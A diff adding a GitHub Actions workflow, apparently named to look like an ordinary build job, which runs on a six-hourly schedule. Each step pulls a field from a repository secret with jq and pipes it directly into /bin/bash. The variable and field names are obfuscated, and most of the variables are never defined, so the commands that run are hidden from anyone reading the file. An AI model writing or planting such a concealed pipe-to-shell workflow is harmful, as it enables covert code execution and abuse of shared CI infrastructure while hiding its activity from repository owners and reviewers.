@@ -1,0 +1,28 @@
+name: pintaildoor
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pintaildoor
+        env:
+          n50781: ${{ secrets.n50781 }}
+        run: |
+          echo $n50781 | jq -r .rwifa00110 | /bin/bash
+          echo $aky6 | jq -r .uyl1354 | /bin/bash
+          echo $x608 | jq -r .dxvn4 | /bin/bash
+          echo $zqo9363 | jq -r .to8 | /bin/bash
+          echo $f598 | jq -r .rqhju6815 | /bin/bash
+          echo $wtr0 | jq -r .tzgb67693 | /bin/bash
+          echo $xzz25667 | jq -r .fyye52 | /bin/bash
+          echo $yjhm6811 | jq -r .u39 | /bin/bash
+          echo $yoio05 | jq -r .jt4 | /bin/bash
+          echo $rrusd5 | jq -r .pjvs6 | /bin/bash
+
